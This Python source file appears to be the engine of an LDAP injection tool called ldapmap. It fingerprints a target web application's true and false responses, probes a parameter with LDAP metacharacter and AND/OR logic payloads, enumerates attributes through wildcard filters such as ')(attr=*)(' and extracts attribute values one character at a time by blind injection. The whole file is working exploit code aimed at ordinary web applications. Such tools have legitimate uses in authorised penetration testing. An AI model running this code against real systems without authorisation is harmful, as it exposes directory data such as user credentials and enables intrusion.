import sys

import requests

from ldapmap_constants import (
    CHARSET,
    COMMON_ATTRIBUTES,
    DETECTION_PAYLOADS,
    LENGTH_TOLERANCE,
    LOGIC_PAYLOADS,
)
from ldapmap_http import send_request
from ldapmap_payloads import build_payload_data


def get_baseline(
    session: requests.Session,
    url: str,
    base_data: dict,
    verbose: bool = False,
    use_json: bool = False,
) -> tuple[int, int]:
    """
    Send an unmodified request and return *(status_code, content_length)*.

    This baseline is used to detect deviations caused by injected payloads.
    """
    resp = send_request(session, url, base_data, verbose, use_json)
    if resp is None:
        print("[!] Could not reach target for baseline request. Aborting.", file=sys.stderr)
        sys.exit(1)
    length = len(resp.content)
    print(f"[*] Baseline — HTTP {resp.status_code}, length={length}")
    return resp.status_code, length


def is_true_response(
    resp: requests.Response | None,
    true_status: int | set[int] | list[int] | tuple[int, ...],
    true_length: int,
    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
) -> bool:
    """
    Return True when *resp* looks like a successful ("true") LDAP result.

    A response is considered "true" when:
      - the HTTP status code is in the TRUE status set, AND
      - the content length is within LENGTH_TOLERANCE bytes of the baseline.
    """
    if resp is None:
        return False
    if isinstance(true_status, int):
        true_statuses = {true_status}
    else:
        true_statuses = set(true_status)
    if false_statuses is None:
        false_status_set: set[int] = set()
    elif isinstance(false_statuses, int):
        false_status_set = {false_statuses}
    else:
        false_status_set = set(false_statuses)
    status = resp.status_code
    if status in true_statuses:
        length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
        return length_match
    if status in false_status_set:
        return False
    return False


def classify_response(
    resp: requests.Response | None,
    true_status: int | set[int] | list[int] | tuple[int, ...],
    true_length: int,
    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
) -> str:
    """
    Classify a response as "true", "false", or "error".

    Status codes in *true_status* are evaluated with content-length matching.
    Status codes in *false_statuses* are classified as "false".
    Any other status code is classified as "error".
    """
    if resp is None:
        return "error"
    if isinstance(true_status, int):
        true_statuses = {true_status}
    else:
        true_statuses = set(true_status)
    if false_statuses is None:
        false_status_set: set[int] = set()
    elif isinstance(false_statuses, int):
        false_status_set = {false_statuses}
    else:
        false_status_set = set(false_statuses)

    if resp.status_code in true_statuses:
        return "true" if is_true_response(resp, true_statuses, true_length) else "false"
    if resp.status_code in false_status_set:
        return "false"
    return "error"


def calibrate(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
) -> tuple[int, int]:
    """
    Attempt to identify a "true" response signature by injecting a wildcard.

    Sends *(param)=** which should match any LDAP entry and return a "true"
    response.  If that wildcard response differs from the baseline we swap the
    reference values so that subsequent checks compare against the correct
    "true" fingerprint.

    Returns the (status, length) pair that represents a TRUE response.
    """
    wildcard_data = build_payload_data(base_data, param, "*", use_json)
    resp = send_request(session, url, wildcard_data, verbose, use_json)
    if resp is None:
        return true_status, true_length

    wc_length = len(resp.content)
    wc_status = resp.status_code

    if wc_status != true_status or abs(wc_length - true_length) > LENGTH_TOLERANCE:
        # The wildcard produced a different response — use it as the TRUE marker
        print(
            f"[*] Calibration: wildcard response differs from baseline. "
            f"Using wildcard signature as TRUE (HTTP {wc_status}, length={wc_length})."
        )
        return wc_status, wc_length

    print(f"[*] Calibration: wildcard matches baseline (HTTP {wc_status}, length={wc_length}).")
    return true_status, true_length


def detect_injection(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    probe_attr: str = "objectClass",
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> bool:
    """
    Probe the target with common LDAP meta-characters and logic payloads.

    Prints a report of which payloads caused a different response, which
    indicates that the parameter is embedded in an LDAP query without sanitization.

    *probe_attr* is the LDAP attribute used in the AND/OR logic probes (e.g.
    ``)(attr=*))(&(attr=``).  It defaults to ``objectClass`` which is present
    on every LDAP entry, but you can supply any attribute that is known to
    exist on the target entry so that the probes do not rely on ``objectClass``
    being present.

    Returns True if at least one payload produced a distinguishable response.
    """
    print("\n[*] --- Detection Phase ---")
    vulnerable = False

    # Build probes dynamically so the caller controls which attribute is used
    detection_payloads = [
        p.replace("objectClass", probe_attr) for p in DETECTION_PAYLOADS
    ]
    logic_payloads = {
        k: v.replace("objectClass", probe_attr) for k, v in LOGIC_PAYLOADS.items()
    }

    for payload in detection_payloads:
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        length = len(resp.content)
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        different = classification != "true"
        marker = "[!] DIFFERENT" if different else "    same     "
        print(
            f"  {marker}  payload={repr(payload):<40} "
            f"HTTP {resp.status_code}, length={length}, class={classification.upper()}"
        )
        if different:
            vulnerable = True

    # AND / OR logic probes
    print("\n[*] AND/OR logic probes:")
    for label, payload in logic_payloads.items():
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(session, url, data, verbose, use_json)
        if resp is None:
            continue
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        looks_true = classification == "true"
        print(
            f"  [{label}] payload={repr(payload):<50} "
            f"→ {classification.upper()}"
        )
        if looks_true:
            vulnerable = True

    return vulnerable


def discover_attributes(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    attributes: list[str] | None = None,
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> list[str]:
    """
    Iterate through *attributes* and test each with a wildcard payload.

    The payload formats are:
      - )(attribute=*)(
      - )(attribute=*)(attribute=
      - )(attribute=*)
    A "true" response implies that attribute exists on the LDAP entry.

    When *attributes* is ``None`` the built-in ``COMMON_ATTRIBUTES`` list is
    used.  Pass a custom list (e.g. built from ``--attributes``) to extend or
    replace that default set.

    Returns the list of attributes that appear to exist.
    """
    if attributes is None:
        attributes = COMMON_ATTRIBUTES
    print("\n[*] --- Attribute Discovery Phase ---")
    found: list[str] = []

    for attr in attributes:
        payload_variants = (
            f")({attr}=*)(",
            f")({attr}=*)({attr}=",
            f")({attr}=*)",
        )
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        attr_found = False
        saw_false = False
        for payload in payload_variants:
            data = build_payload_data(base_data, param, payload, use_json)
            resp = send_request(session, url, data, verbose, use_json)
            if resp is None:
                continue
            classification = classify_response(resp, status_true_set, true_length, false_statuses)
            if classification == "true":
                print(f"  [+] Attribute present: {attr}")
                found.append(attr)
                attr_found = True
                break
            if classification == "false":
                saw_false = True
                continue
            print(
                f"  [!] Attribute {attr}: unexpected HTTP {resp.status_code} (classified as ERROR)",
                file=sys.stderr,
            )
        if not attr_found and saw_false:
            print(f"  [-] Attribute absent:  {attr}")

    return found


def extract_attribute(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    attribute: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
) -> str:
    """
    Extract the value of *attribute* one character at a time using LDAP wildcards.

    For each position the function tries every character in CHARSET by sending
    a payload of the form:
        )(attribute=<known_prefix><candidate>*)

    When the response looks "true" the candidate character is appended to the
    known prefix and the search moves to the next position.

    The discovered value is printed incrementally to stdout.

    Returns the fully extracted value string.
    """
    print(f"\n[*] --- Extraction Phase: {attribute} ---")
    extracted = ""
    print(f"  [*] Extracting {attribute}: ", end="", flush=True)

    while True:
        found_char = False
        for char in CHARSET:
            # Build blind payload: )(attr=<prefix><char>*)
            payload = f")({attribute}={extracted}{char}*)"
            data = build_payload_data(base_data, param, payload, use_json)
            resp = send_request(session, url, data, verbose, use_json)
            if resp is None:
                continue
            status_true_set = true_statuses if true_statuses is not None else {true_status}
            classification = classify_response(resp, status_true_set, true_length, false_statuses)
            if classification == "true":
                extracted += char
                print(char, end="", flush=True)
                found_char = True
                break  # Move to next position
            if classification == "error":
                print(
                    f"\n  [!] Unexpected HTTP {resp.status_code} while testing {attribute} "
                    f"prefix '{extracted}{char}' (classified as ERROR)",
                    file=sys.stderr,
                )

        if not found_char:
            # No character matched — value is fully extracted
            break

    print()  # Newline after the extracted value
    return extracted
